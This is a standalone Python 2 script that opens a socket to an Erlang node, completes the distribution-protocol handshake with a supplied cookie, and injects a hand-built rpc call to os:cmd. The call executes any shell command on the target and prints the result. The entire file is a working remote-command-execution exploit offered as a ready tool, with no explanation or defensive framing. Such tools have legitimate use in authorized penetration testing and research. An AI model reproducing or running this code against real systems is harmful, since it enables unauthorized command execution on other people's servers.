#!/usr/bin/env python2

from struct import pack, unpack
from cStringIO import StringIO
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse

def rand_id(n=6):
  return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('cmd', action='store', type=str, help='Shell command to execute')

args = parser.parse_args()

name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert(sock)

sock.connect((args.target, args.port))

def send_name(name):
  return pack('!HcHI', 7 + len(name), 'n', 5, 0x3499c) + name

sock.sendall(send_name(name))


data = sock.recv(5)
assert(data == '\x00\x03\x73\x6f\x6b')

data = sock.recv(4096)
(length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
challenge = '%u' % challenge

def send_challenge_reply(cookie, challenge):
  m = md5()
  m.update(cookie)
  m.update(challenge)
  response = m.digest()
  return pack('!HcI', len(response)+5, 'r', 0) + response

sock.sendall(send_challenge_reply(args.cookie, challenge))


data = sock.recv(3)
if len(data) == 0:
  print('wrong cookie, auth unsuccessful')
  sys.exit(1)
else:
  assert(data == '\x00\x11\x61')
  digest = sock.recv(16)
  assert(len(digest) == 16)

def encode_string(name, type=0x64):
  return pack('!BH', type, len(name)) + name


def send_cmd(name, cmd):
  data = (unhexlify('70836804610667') + 
    encode_string(name) + 
    unhexlify('0000000300000000006400006400037265') +
    unhexlify('7883680267') + 
    encode_string(name) + 
    unhexlify('0000000300000000006805') +
    encode_string('call') +
    encode_string('os') +
    encode_string('cmd') +
    unhexlify('6c00000001') + 
    encode_string(cmd, 0x6b) + 
    unhexlify('6a') + 
    encode_string('user'))

  return pack('!I', len(data)) + data

def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)

sock.sendall(send_cmd(name, args.cmd))

def recv_reply(f):
  data = f.recv(4)
  assert(len(data) == 4)

  (length,) = unpack('!I', data)

  data = f.recv(length)
  assert(len(data) == length)

  (header, footer) = data.split(unhexlify('00000003000000000083'))
  (header, footer) = footer.split(unhexlify('6b'))

  (length,) = unpack('!H', footer[:2])
  assert(len(footer[2:]) == length)

  return footer[2:]

data = recv_reply(sock)
sys.stdout.write(data)

sock.close()
